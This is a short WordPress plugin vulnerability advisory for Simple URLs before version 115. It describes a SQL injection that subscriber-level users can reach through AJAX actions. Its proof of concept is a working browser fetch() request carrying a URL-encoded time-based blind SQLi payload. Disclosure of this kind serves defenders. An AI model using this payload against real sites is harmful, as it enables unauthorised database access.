## WordPress Plugin Vulnerabilities

# Simple URLs < 115 - Subscriber+ SQLi

### Description

The plugin does not escape some parameters before using them in various SQL statements used by AJAX actions available by any authenticated users, leading to a SQL injection exploitable by low privilege users such as subscriber.

### Proof of Concept

Run the below command in the developer console of the web browser while being on the blog as a subscriber user and notice the delay of 5s to receive the response
fetch("/wp-admin/admin-ajax.php", {
"headers": {
"content-type": "application/x-www-form-urlencoded",
},
"method": "POST",
"body": 'action=lasso\_lite\_group\_get\_list&page=1&keyword=v%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F9434%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29kcCp%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27oJFG%27%3D%27oJFG',
"credentials": "include"
}).then(response => response.text())
.then(data => console.log(data));
